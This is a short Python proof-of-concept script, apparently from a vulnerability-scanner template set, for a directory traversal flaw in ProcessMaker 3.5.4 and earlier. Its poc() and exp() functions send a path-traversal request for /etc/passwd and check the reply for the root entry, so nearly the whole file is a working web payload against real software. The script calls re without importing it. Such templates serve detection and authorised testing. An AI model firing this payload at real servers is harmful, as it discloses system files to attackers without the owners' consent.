import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ProcessMaker <= 3.5.4 Directory Traversal''',
        "description": '''A vulnerability in ProcessMaker allows remote attackers to access arbitrary files and disclose their content.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/50229", 
            "https://www.processmaker.com"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["processmaker", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/../../../..//etc/passwd"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url